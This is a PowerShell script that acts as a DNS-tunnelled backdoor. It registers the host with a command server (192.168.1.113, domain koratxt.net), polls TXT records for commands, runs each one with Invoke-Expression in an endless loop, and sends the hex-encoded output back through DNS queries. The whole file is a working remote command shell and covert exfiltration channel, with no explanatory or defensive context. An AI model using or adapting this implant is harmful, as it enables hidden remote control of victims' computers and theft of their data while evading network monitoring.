$server = '192.168.1.113'
$name = 'koratxt.net'
$hostname = Get-Content env:computername
if ($hostname.Length -gt 23) {
    $hostname = $hostname.Substring(0,23)
}

function StringToHex($i) {
    $r = ""
    $i.ToCharArray() | ForEach-Object -Process {
        $r += '{0:X2}' -f [int][char]$_
    }
    return $r
}

function HexToString($i) {
    $r = ""
    for ($n = 0; $n -lt $i.length; $n += 2) {
        $r += [char][int]("0x" + $i.Substring($n,2))
    }
    return $r
}

function split_to_chunks($astring, $size=46) {
    $new_arr = @()
    $chunk_index=0
    for ($i=0; $i -lt [math]::floor($astring.length / $size); $i++) {
        $new_arr += @($astring.substring($chunk_index,$size))
        $chunk_index += $size
    }
    $new_arr += @($astring.substring($chunk_index,$astring.length - $chunk_index))
    return $new_arr
}

function send_response($response) {
    
    $chunks = (split_to_chunks (StringToHex ($response)))
    foreach ($j in $chunks) {
        $encCmd = StringToHex('cnk')
        $k = $(Resolve-DnsName -Server $server -Name "$j.$id.$encCmd.$name" -Type TXT).Strings
    }
    $encCmd = StringToHex('end')
    $k = $(Resolve-DnsName -Server $server -Name "$id.$encCmd.$name" -Type TXT)
}

#initialize
$encHostname = StringtoHex($hostname)
$encCmd = StringToHex('int')
$id = $(Resolve-DnsName -Server $server -Name "$encHostname.0.$encCmd.$name" -Type TXT).Strings

while ($true) {
    $encCmd = StringToHex('cmd')
    $cmd = $(Resolve-DnsName -Server $server -Name "$id.$encCmd.$name" -Type TXT).Strings

    if ($cmd.length -ne 0) {
        $response = (iex "$cmd" -ErrorVariable cmdError) | Out-String
        $response += $cmdError
        
        if ($response.Length -gt 0) {
            send_response $response
        }
    }

    sleep -Seconds 5
}
